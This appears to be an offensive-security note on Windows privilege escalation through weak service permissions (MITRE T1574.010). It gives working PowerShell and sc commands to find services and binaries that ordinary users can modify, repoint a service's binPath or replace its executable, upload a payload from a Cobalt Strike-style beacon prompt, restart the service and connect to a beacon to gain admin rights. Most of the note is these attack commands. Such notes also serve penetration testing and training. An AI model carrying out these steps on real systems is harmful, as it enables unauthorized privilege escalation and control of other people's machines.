# Weak Service Permissions
Identify weak [[Windows Services]] permissions via [[Tools/SharpUp]].

## Change BinPath via ChangeConfig
1. Identify vulnerable config via Get-ServiceAcl.ps1
``````powershell
Import-Module C:\Tools\Get-ServiceAcl.ps1
Get-ServiceAcl -Name VulnService | select -expandproperty Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
``````
2. **Authenticated Users** have **ChangeConfig**, **Start** and **Stop** privileges
3. Change binPath
``````powershell
sc qc VulnService
sc config VulnService binPath= C:\Temp\test-service.exe
#query config
sc qc VulnService
#query status
sc query VulnService
sc stop VulnService
sc start VulnService
``````

## Change Service Binary
1. Identify BUILTIN\Users have **Modify**
``````powershell
Get-Acl -Path "C:\Program Files\VulnService\Service.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\VulnService\Service.exe
Owner  : BUILTIN\Administrators
Group  : wkstn1\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
 BUILTIN\Administrators Allow  FullControl
 BUILTIN\Users Allow  Modify, Synchronize
 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
``````
2. Manipulate the service binary
``````powershell
sc stop VulnService
beacon> upload C:\Payloads\Service.exe
run sc start VulnService
#if tcp beacon
beacon> connect localhost 4444
``````


## Tools
########
########


```meta
ttp: T1574.010
requirements: 
results: admin
description: Weak service permissions can be abused in order to change the binpath
```